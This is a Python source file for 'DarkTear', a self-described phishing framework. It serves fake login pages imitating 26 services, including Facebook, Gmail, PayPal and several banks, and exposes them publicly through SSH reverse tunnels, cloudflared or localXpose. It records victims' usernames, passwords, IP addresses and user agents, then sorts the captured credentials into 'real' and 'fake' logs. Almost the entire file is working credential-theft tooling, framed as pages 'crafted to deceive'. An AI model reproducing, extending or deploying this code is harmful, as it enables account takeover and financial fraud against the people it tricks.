#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DarkTear v1.0 - by WastelandX

import os
import sys
import time
import socket
import subprocess
import threading
import random
import json
import re
import shutil
from datetime import datetime
from pathlib import Path

# ========== COLORS ==========
R = '\033[91m'      # Red
B = '\033[96m'      # Electric Blue
O = '\033[93m'      # Orange
G = '\033[92m'      # Green
Y = '\033[93m'      # Yellow
W = '\033[97m'      # White
RS = '\033[0m'      # Reset
BOLD = '\033[1m'

# ========== LOGO ==========
def show_logo():
    os.system('clear' if os.name == 'posix' else 'cls')
    logo_lines = [
        "____    ____   ____   _  __",
        "|  _ \\  / _  | |  _ \\ | |/ /  Made",
        "| | | || | | | | |_) || ' |   By",
        "| |_| || |_| | |  _ < | . \\   WastelandX.",
        "|____/  \\___ | |_|_\\_\\|_|\\_\\",
        "|_   _|| ____| / _  ||  _ \\",
        "  | |  |  _|  | | | || |_) |",
        "  | |  | |___ | |_| ||  _ <",
        "  |_|  |_____| \\___ ||_| \\_\\"
    ]
    colors = [R, B, O]
    for line in logo_lines:
        colored = ""
        for i, ch in enumerate(line):
            if ch == " ":
                colored += " "
            else:
                colored += f"{colors[i % 3]}{ch}"
        print(colored + RS)
    print(f"\n{R}Where DDoS and Phishing meets eachother.{RS}")
    print(f"{R}" + "═"*60 + f"{RS}")

# ========== PAGE LIBRARY ==========
PAGES = [
    {"id": "01", "name": "Facebook", "file": "facebook.html", "redirect": "https://facebook.com"},
    {"id": "02", "name": "Instagram", "file": "instagram.html", "redirect": "https://www.instagram.com/accounts/login"},
    {"id": "03", "name": "Gmail", "file": "gmail.html", "redirect": "https://mail.google.com"},
    {"id": "04", "name": "Netflix", "file": "netflix.html", "redirect": "https://www.netflix.com/login"},
    {"id": "05", "name": "PayPal", "file": "paypal.html", "redirect": "https://www.paypal.com/signin"},
    {"id": "06", "name": "GitHub", "file": "github.html", "redirect": "https://github.com/login"},
    {"id": "07", "name": "Roblox", "file": "roblox.html", "redirect": "https://RobuxLoot.roblox.com"},
    {"id": "08", "name": "Microsoft", "file": "microsoft.html", "redirect": "https://login.live.com"},
    {"id": "09", "name": "Twitter/X", "file": "twitter.html", "redirect": "https://twitter.com/login"},
    {"id": "10", "name": "Amazon", "file": "amazon.html", "redirect": "https://www.amazon.com/ap/signin"},
    {"id": "11", "name": "Snapchat", "file": "snapchat.html", "redirect": "https://accounts.snapchat.com"},
    {"id": "12", "name": "TikTok", "file": "tiktok.html", "redirect": "https://www.tiktok.com/login"},
    {"id": "13", "name": "LinkedIn", "file": "linkedin.html", "redirect": "https://www.linkedin.com/login"},
    {"id": "14", "name": "Discord", "file": "discord.html", "redirect": "https://discord.com/login"},
    {"id": "15", "name": "Steam", "file": "steam.html", "redirect": "https://steamcommunity.com/login"},
    {"id": "16", "name": "Apple ID", "file": "apple.html", "redirect": "https://appleid.apple.com"},
    {"id": "17", "name": "Yahoo", "file": "yahoo.html", "redirect": "https://login.yahoo.com"},
    {"id": "18", "name": "WhatsApp", "file": "whatsapp.html", "redirect": "https://web.whatsapp.com"},
    {"id": "19", "name": "Spotify", "file": "spotify.html", "redirect": "https://accounts.spotify.com"},
    {"id": "20", "name": "Bank of America", "file": "boa.html", "redirect": "https://www.bankofamerica.com"},
    {"id": "21", "name": "Chase", "file": "chase.html", "redirect": "https://secure.chase.com"},
    {"id": "22", "name": "Wells Fargo", "file": "wells.html", "redirect": "https://www.wellsfargo.com"},
    {"id": "23", "name": "IG Business", "file": "ig_business.html", "redirect": "https://business.instagram.com/login"},
    {"id": "24", "name": "FB Business", "file": "fb_business.html", "redirect": "https://business.facebook.com/login"},
    {"id": "25", "name": "Blockman GO", "file": "blockmango.html", "redirect": "https://GcubeLoot.blockmango.com"},
    {"id": "26", "name": "Custom Clone", "file": "custom.html", "redirect": None},
]

PAGES_DICT = {p["id"]: p for p in PAGES}
# ========== MAIN MENU ==========
def main_menu():
    print(f"\n{B}[ MAIN MENU ]{RS}")
    options = [
        ("1", "Select Attack Vector"),
        ("2", "Choose Template"),
        ("3", "Tunneling Method"),
        ("4", "Launch DarkTear"),
        ("5", "View Captured Data"),
        ("6", "Exit"),
        ("7", "The Story of DarkTear")
    ]
    for num, desc in options:
        print(f"  {O}[{num}]{W} {desc}{RS}")
    print(f"\n{R}" + "─"*60 + f"{RS}")
    return input(f"\n{O}[?]{W} Select option [1-7]: {RS}").strip()

# ========== TEMPLATE MENU ==========
def template_menu():
    print(f"\n{B}[ SELECT PHISHING PAGE ]{RS}")
    print(f"{R}" + "═"*60 + f"{RS}")
    half = len(PAGES) // 2
    left = PAGES[:half]
    right = PAGES[half:]
    for i in range(len(left)):
        l = left[i]
        r = right[i] if i < len(right) else None
        l_str = f"  {O}[{l['id']}]{W} {l['name']:20}{RS}"
        if r:
            print(l_str + f"  {O}[{r['id']}]{W} {r['name']}{RS}")
        else:
            print(l_str)
    print(f"\n{R}" + "─"*60 + f"{RS}")
    print(f"  {O}[0]{W} Back to Main Menu{RS}")
    print(f"\n{R}" + "═"*60 + f"{RS}")
    return input(f"\n{O}[?]{W} Select template [0-26]: {RS}").strip()

# ========== TUNNEL MENU ==========
def tunnel_menu():
    print(f"\n{B}[ TUNNELING METHOD ]{RS}")
    print(f"{R}" + "─"*60 + f"{RS}")
    tunnels = [
        ("1", "localhost.run", "PHP + SSH - Default"),
        ("2", "cloudflared", "Requires installation"),
        ("3", "localXpose", "Requires token"),
        ("4", "Serveo", "No install - Fallback"),
        ("5", "Custom Domain", "Pro mode - VPS needed")
    ]
    for num, name, desc in tunnels:
        print(f"  {O}[{num}]{W} {name:15} {B}({desc}){RS}")
    print(f"\n  {O}[0]{W} Back to Main Menu{RS}")
    print(f"\n{R}" + "─"*60 + f"{RS}")
    return input(f"\n{O}[?]{W} Select tunnel [0-5]: {RS}").strip()

def get_localxpose_token():
    print(f"\n{Y}[!] localXpose requires authentication{RS}")
    return input(f"{O}[?]{W} Enter your localXpose token: {RS}").strip()

# ========== STORY MODE ==========
def show_story():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{B}" + "╔" + "═"*58 + "╗")
    print(f"║{W}              THE MAKING OF DARKTEAR              {B}║")
    print(f"║{W}                   by WastelandX                   {B}║")
    print(f"╚" + "═"*58 + "╝{RS}\n")
    
    story = [
        "DarkTear was not built in a day. It was built in the VOID.",
        "",
        "▸ Started with a simple ADB roast spammer",
        "▸ Evolved into DDoS tools",
        "▸ Grew into LAMIA — an AI worm",
        "▸ Found its true form: a phishing framework",
        "",
        "▸ Name chosen: DarkTear",
        "▸ Creator named: WastelandX",
        "▸ Colors: Red, Electric Blue, Orange, White",
        "▸ Logo: Tri-color mixed masterpiece",
        "▸ Tunnel logo: Bold Blue block art",
        "▸ Pages: 26 targets + Custom Clone",
        "▸ Tunnel methods: localhost.run, cloudflared, localXpose",
        "",
        "Every line of code was forged in darkness.",
        "Every page was crafted to deceive.",
        "Every tunnel was built to deliver.",
        "",
        "This is not just a tool. This is a statement.",
        "",
        "— WastelandX (The Architect, The VOID, The Director, The Primordial)"
    ]
    
    for line in story:
        if line.startswith("▸"):
            print(f"  {G}{line}{RS}")
        elif line == "":
            print()
        elif line.startswith("—"):
            print(f"\n{O}{line}{RS}")
        else:
            print(f"  {W}{line}{RS}")
    
    print(f"\n{R}" + "═"*60 + f"{RS}")
    input(f"\n{W}Press Enter to return to menu...{RS}")
# ========== SERVER FUNCTIONS ==========
def start_php_server(port=8080):
    try:
        proc = subprocess.Popen(["php", "-S", f"0.0.0.0:{port}"], 
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{G}[+] PHP server started on port {port}{RS}")
        return proc
    except FileNotFoundError:
        print(f"{R}[-] PHP not found. Please install PHP.{RS}")
        return None

def start_localhost_run(port=8080):
    print(f"{G}[+] Creating localhost.run tunnel...{RS}")
    try:
        proc = subprocess.Popen(["ssh", "-R", f"80:localhost:{port}", "localhost.run"],
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        time.sleep(2)
        print(f"{B}[i] Tunnel started. Check output for URL.{RS}")
        return proc
    except Exception as e:
        print(f"{R}[-] Tunnel failed: {e}{RS}")
        return None

def start_cloudflared(port=8080):
    print(f"{G}[+] Starting cloudflared tunnel...{RS}")
    print(f"{Y}[!] Make sure cloudflared is installed{RS}")
    try:
        return subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    except FileNotFoundError:
        print(f"{R}[-] cloudflared not found{RS}")
        return None

def start_localxpose(token, port=8080):
    print(f"{G}[+] Starting localXpose tunnel...{RS}")
    try:
        return subprocess.Popen(["loclx", "tunnel", "http", "--to", f"localhost:{port}", "--token", token],
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    except FileNotFoundError:
        print(f"{R}[-] localXpose not found{RS}")
        return None
# ========== FAKE DETECTOR ==========
def detect_fake(username, password):
    score, reasons = 0, []
    if '@' in username:
        domain = username.split('@')[-1]
        if domain in ['test.com', 'example.com', 'mailinator.com', 'yopmail.com', 'tempmail.com']:
            score += 40; reasons.append("Disposable email domain")
    test_patterns = ['test', 'fake', 'asdf', '123', 'demo', 'sample']
    for p in test_patterns:
        if p in username.lower(): score += 10; reasons.append(f"Username contains '{p}'"); break
    for p in test_patterns:
        if p in password.lower(): score += 10; reasons.append(f"Password contains '{p}'"); break
    if len(password) < 6: score += 15; reasons.append("Password too short")
    if password in ['password', '123456', 'qwerty', 'admin']: score += 30; reasons.append("Common password")
    if username == password: score += 25; reasons.append("Username matches password")
    return {"fake": score >= 50, "confidence": min(score, 100), "reasons": reasons}

# ========== CREDENTIAL LOGGER ==========
def log_credentials(page_name, username, password, ip="Unknown", ua="Unknown"):
    os.makedirs("logs", exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"\n[{ts}]\nPage: {page_name}\nIP: {ip}\nUA: {ua}\nUsername: {username}\nPassword: {password}\n{'-'*40}\n"
    
    fake = detect_fake(username, password)
    if fake["fake"]:
        with open("logs/fake.txt", "a") as f:
            f.write(entry + f"FAKE: {fake['confidence']}% - {', '.join(fake['reasons'])}\n\n")
        print(f"{Y}[!] Fake credentials ({fake['confidence']}%){RS}")
    else:
        with open("logs/real.txt", "a") as f:
            f.write(entry + f"REAL: {100-fake['confidence']}% confidence\n\n")
        print(f"{G}[+] REAL credentials!{RS}\n{W}User: {username}\nPass: {password}{RS}")
    
    if 40 <= fake["confidence"] < 60:
        with open("logs/unknown.txt", "a") as f:
            f.write(entry + f"BORDERLINE: {fake['confidence']}%\n\n")

# ========== VIEW CAPTURED ==========
def view_captured():
    while True:
        print(f"\n{B}[ CAPTURED DATA ]{RS}\n{R}" + "─"*60 + f"{RS}")
        print(f"  {O}[1]{W} Real Credentials\n  {O}[2]{W} Fake/Test\n  {O}[3]{W} Unknown\n  {O}[4]{W} Clear Logs\n  {O}[0]{W} Back")
        print(f"\n{R}" + "─"*60 + f"{RS}")
        c = input(f"\n{O}[?]{W} Select [0-4]: {RS}").strip()
        if c == "0": break
        elif c == "1": view_file("logs/real.txt", "REAL CREDENTIALS")
        elif c == "2": view_file("logs/fake.txt", "FAKE/TEST")
        elif c == "3": view_file("logs/unknown.txt", "UNKNOWN")
        elif c == "4": clear_logs()
        else: print(f"{R}[-] Invalid{RS}")

def view_file(fname, title):
    print(f"\n{B}[ {title} ]{RS}\n{R}" + "═"*60 + f"{RS}")
    try:
        with open(fname, "r") as f:
            content = f.read().strip()
            print(f"{W}{content if content else '[!] No data'}{RS}")
    except FileNotFoundError:
        print(f"{Y}[!] No data{RS}")
    print(f"\n{R}" + "═"*60 + f"{RS}")
    input(f"\n{W}Press Enter...{RS}")

def clear_logs():
    if input(f"{R}[!] Sure? (yes/no): {RS}").lower() == "yes":
        for f in ["logs/real.txt", "logs/fake.txt", "logs/unknown.txt"]:
            open(f, "w").close()
        print(f"{G}[+] Logs cleared{RS}")
    time.sleep(1)
# ========== LAUNCH DARKTEAR ==========
def launch_darktear(page_id, tunnel_choice, lx_token=None):
    if page_id not in PAGES_DICT:
        print(f"{R}[-] Invalid page{RS}"); return
    page = PAGES_DICT[page_id]
    html = f"pages/{page['file']}"
    if not os.path.exists(html):
        print(f"{R}[-] File not found: {html}{RS}"); return
    
    print(f"\n{G}[+] Selected: {page['name']}{RS}")
    shutil.copy(html, "index.html")
    php = start_php_server()
    if not php: return
    
    tunnel = None
    if tunnel_choice == "1": tunnel = start_localhost_run()
    elif tunnel_choice == "2": tunnel = start_cloudflared()
    elif tunnel_choice == "3":
        if not lx_token: lx_token = get_localxpose_token()
        tunnel = start_localxpose(lx_token)
    elif tunnel_choice == "4": tunnel = start_serveo()
    elif tunnel_choice == "5": print(f"{Y}[!] Custom domain mode{RS}")
    else: print(f"{R}[-] Invalid tunnel{RS}"); php.terminate(); return
    
    print(f"\n{G}[+] Attack live! Press Ctrl+C to stop{RS}\n")
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Stopping...{RS}")
        if php: php.terminate()
        if tunnel: tunnel.terminate()
        print(f"{G}[+] Stopped{RS}")

# ========== MAIN PROGRAM ==========
def main():
    selected_page = None
    selected_tunnel = None
    lx_token = None
    
    while True:
        show_logo()
        choice = main_menu()
        
        if choice == "1":
            print(f"\n{Y}[!] Attack Vector coming soon{RS}"); time.sleep(1)
        elif choice == "2":
            pc = template_menu()
            if pc == "0": continue
            elif pc in PAGES_DICT:
                selected_page = pc
                print(f"{G}[+] Selected: {PAGES_DICT[pc]['name']}{RS}")
            else: print(f"{R}[-] Invalid{RS}")
            time.sleep(1)
        elif choice == "3":
            tc = tunnel_menu()
            if tc == "0": continue
            elif tc in ["1","2","3","4","5"]:
                selected_tunnel = tc
                print(f"{G}[+] Tunnel method selected{RS}")
                if tc == "3": lx_token = get_localxpose_token()
            else: print(f"{R}[-] Invalid{RS}")
            time.sleep(1)
        elif choice == "4":
            if not selected_page: print(f"{R}[-] No page selected{RS}")
            elif not selected_tunnel: print(f"{R}[-] No tunnel selected{RS}")
            else: launch_darktear(selected_page, selected_tunnel, lx_token)
        elif choice == "5":
            view_captured()
        elif choice == "6":
            print(f"\n{Y}[!] Exiting DarkTear...{RS}")
            print(f"{G}[+] Thanks, WastelandX{RS}")
            sys.exit(0)
        elif choice == "7":
            show_story()
        else:
            print(f"{R}[-] Invalid choice{RS}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted{RS}")
        sys.exit(0)

def start_serveo(port=8080):
    print(f"{G}[+] Starting Serveo tunnel...{RS}")
    try:
        return subprocess.Popen(["ssh", "-R", f"80:localhost:{port}", "serveo.net"],
                                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    except Exception as e:
        print(f"{R}[-] Serveo failed: {e}{RS}")
        return None